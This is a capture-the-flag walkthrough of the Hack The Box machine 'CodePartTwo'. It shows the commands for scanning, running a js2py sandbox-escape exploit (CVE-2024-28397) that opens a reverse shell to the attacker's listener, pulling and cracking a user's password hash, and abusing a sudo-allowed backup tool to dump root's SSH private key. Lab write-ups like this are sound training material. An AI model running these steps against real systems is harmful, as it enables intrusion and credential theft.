---
created: 2026-02-08
tags:
  - sapling
title: HTB - CodePartTwo
---
## How many open TCP ports are listening on CodePartTwo?

The initial scan was performed using RustScan and Nmap to identify active services:

JavaScript

```
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ rustscan -a 10.129.232.59 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\      }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.

Open 10.129.232.59:22
Open 10.129.232.59:8000

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63
```

**Answer:** 2

---

## What is the version of the js2py library being used by the application?

The application source code was downloaded and the dependencies were inspected in `requirements.txt`:

JavaScript

```
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ unzip app.zip
...
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ cat app/requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

**Answer:** 0.74

---

## Which CVE number corresponds to the sandbox escape vulnerability in js2py that the application uses?

Searching for js2py 0.74 vulnerabilities reveals a critical sandbox escape flaw: **Answer:** CVE-2024-28397

---

## What is the name of the database used by the application?

The environment was set up to execute the exploit and gain a reverse shell:

```js
┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
└─$ uv run python exploit.py --target http://10.129.232.59:8000/run_code --lhost 10.10.14.236 --lport 4444
[*] Sending exploit payload...
[+] Payload sent successfully!

# On the netcat listener:
python3 -c 'import pty; pty.spawn("/bin/bash")'

app@codeparttwo:~/app$ ls instance
users.db
```

**Answer:** users.db

---

## What is the recovered password for the user marco?

The database was inspected to extract the password hashes:

```js
app@codeparttwo:~/app$ cat instance/users.db
...
Mmarco649c9d65a206a75f5abe509fe128bce5
```

The hash `649c9d65a206a75f5abe509fe128bce5` was cracked using CrackStation. **Answer:** [Recovered plaintext password]

---

## Submit the flag located in the marco user's home directory.

Logged in via SSH using the recovered credentials:

```js
┌──(kali㉿kali)-[~]
└─$ ssh marco@10.129.232.59
marco@10.129.232.59's password: 

marco@codeparttwo:~$ cat user.txt
```

---

## What is the full path to the backup utility that the marco user can run as root without a password?

Checked sudo permissions:

```js
marco@codeparttwo:~$ sudo -l
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

**Answer:** /usr/local/bin/npbackup-cli

---

## What is the full backup path defined in the npbackup configuration file found in marco’s home directory?

Inspected the configuration file `npbackup.conf`:

JavaScript

```
marco@codeparttwo:~$ cat npbackup.conf
...
    backup_opts:
      paths:
      - /home/app/app/
```

**Answer:** /home/app/app/

---

## Submit the flag located in the root user's home directory.

Modified the configuration to point to `/root` and performed a backup to dump the root SSH key:

JavaScript

```
# Modify path to /root in npbackup1.conf
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

Final access was gained by using the dumped RSA key to SSH as root:

JavaScript

```
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ chmod 600 id_rsa
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ssh -i id_rsa root@10.129.232.59

root@codeparttwo:~# cat root.txt
```